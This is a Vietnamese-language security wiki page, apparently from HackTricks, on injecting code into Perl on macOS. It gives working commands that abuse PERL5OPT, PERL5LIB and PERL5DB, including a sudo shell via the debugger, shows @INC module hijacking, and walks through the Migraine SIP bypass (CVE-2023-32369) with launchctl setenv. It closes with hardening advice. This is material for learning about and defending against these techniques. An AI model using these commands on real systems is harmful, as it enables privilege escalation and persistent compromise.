# Chèn vào ứng dụng Perl trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## Qua biến môi trường `PERL5OPT` và `PERL5LIB`

Có thể dùng biến môi trường **`PERL5OPT`** để khiến **Perl** thực thi các lệnh tùy ý khi trình thông dịch khởi động (ngay cả **trước khi** phân tích dòng đầu tiên của script mục tiêu).  
Ví dụ, tạo script sau:

```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```

Bây giờ **export biến môi trường** và thực thi script **perl**:

```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```

Một lựa chọn khác là tạo một module Perl (ví dụ: `/tmp/pmod.pm`):

```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```

Sau đó sử dụng các biến môi trường để module được tự động định vị và tải:

```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```

### Các biến môi trường thú vị khác

- **`PERL5DB`** – khi trình thông dịch được khởi chạy với cờ **`-d`** (debugger), nội dung của `PERL5DB` sẽ được thực thi dưới dạng mã Perl *bên trong* ngữ cảnh debugger.  
  Nếu bạn có thể kiểm soát cả môi trường **và** các cờ dòng lệnh của một tiến trình Perl có đặc quyền, bạn có thể làm như sau:
  
  ```bash
  export PERL5DB='system("/bin/zsh")'
  sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
  ```

- **`PERL5SHELL`** – trên Windows, biến này kiểm soát executable shell mà Perl sẽ sử dụng khi cần khởi chạy một shell. Biến này chỉ được đề cập ở đây để đầy đủ thông tin, vì nó không liên quan đến macOS.

Mặc dù `PERL5DB` yêu cầu switch `-d`, ta thường bắt gặp các script bảo trì hoặc cài đặt chạy với quyền *root* và bật flag này để troubleshooting chi tiết, khiến biến này trở thành một vector leo thang quyền hợp lệ.

## Thông qua dependencies (lạm dụng @INC)

Có thể liệt kê đường dẫn include mà Perl sẽ tìm kiếm (**`@INC`**) bằng cách chạy:

```bash
perl -e 'print join("\n", @INC)'
```

Đầu ra điển hình trên macOS 13/14 trông như sau:

```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```

Một số thư mục được trả về thậm chí còn không tồn tại, tuy nhiên **`/Library/Perl/5.30`** thì có, *không* được SIP bảo vệ và nằm *trước* các thư mục được SIP bảo vệ. Do đó, nếu có thể ghi với quyền *root*, bạn có thể thả một module độc hại (ví dụ: `File/Basename.pm`), module này sẽ được mọi script có đặc quyền import ưu tiên tải.

> [!WARNING]
> Bạn vẫn cần quyền **root** để ghi vào bên trong `/Library/Perl`, và macOS sẽ hiển thị lời nhắc **TCC** yêu cầu *Full Disk Access* cho tiến trình thực hiện thao tác ghi.

Ví dụ: nếu một script import **`use File::Basename;`**, thì có thể tạo `/Library/Perl/5.30/File/Basename.pm` chứa mã do attacker kiểm soát.

## Bypass SIP thông qua Migration Assistant (CVE-2023-32369 “Migraine”)

Tháng 5 năm 2023, Microsoft công bố **CVE-2023-32369**, có biệt danh **Migraine**, một kỹ thuật post-exploitation cho phép attacker có quyền *root* **bypass hoàn toàn System Integrity Protection (SIP)**.  
Thành phần dễ bị tấn công là **`systemmigrationd`**, một daemon có entitlement **`com.apple.rootless.install.heritable`**. Mọi tiến trình con do daemon này khởi chạy đều kế thừa entitlement đó và vì vậy chạy **ngoài** các hạn chế của SIP.<sup>[[1]](#references)</sup>

Trong số các tiến trình con được các nhà nghiên cứu xác định có trình thông dịch được Apple ký:<sup>[[1]](#references)</sup>

```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```

Vì Perl tuân theo `PERL5OPT` (và Bash tuân theo `BASH_ENV`), chỉ cần đầu độc *environment* của daemon là đủ để thực thi mã tùy ý trong ngữ cảnh không có SIP:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```

Khi `migrateLocalKDC` chạy, `/usr/bin/perl` khởi động với `PERL5OPT` độc hại và thực thi `/private/tmp/migraine.sh` *trước khi SIP được bật lại*. Từ script đó, bạn có thể, chẳng hạn, sao chép payload vào **`/System/Library/LaunchDaemons`** hoặc gán extended attribute `com.apple.rootless` để khiến một file **không thể bị xóa**.

Apple đã khắc phục vấn đề này trong macOS **Ventura 13.4**, **Monterey 12.6.6** và **Big Sur 11.7.7**, nhưng các hệ thống cũ hơn hoặc chưa được vá vẫn có thể bị khai thác.<sup>[[1]](#references)</sup>

## Khuyến nghị hardening

1. **Xóa các biến nguy hiểm** – launchdaemon hoặc cron job có đặc quyền nên khởi chạy với môi trường sạch (`launchctl unsetenv PERL5OPT`, `env -i`, v.v.).
2. **Tránh chạy interpreter với quyền root** trừ khi thực sự cần thiết. Hãy dùng binary đã biên dịch hoặc hạ quyền sớm.
3. **Đóng gói script cùng với `-T` (taint mode)** để Perl bỏ qua `PERL5OPT` và các switch không an toàn khác khi bật taint checking.
4. **Luôn cập nhật macOS** – “Migraine” đã được vá hoàn toàn trong các bản phát hành hiện tại.

## References

- [1] [Microsoft Security Blog – Lỗ hổng macOS mới, Migraine, có thể vượt qua System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Phần 1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)
{{#include ../../../banners/hacktricks-training.md}}
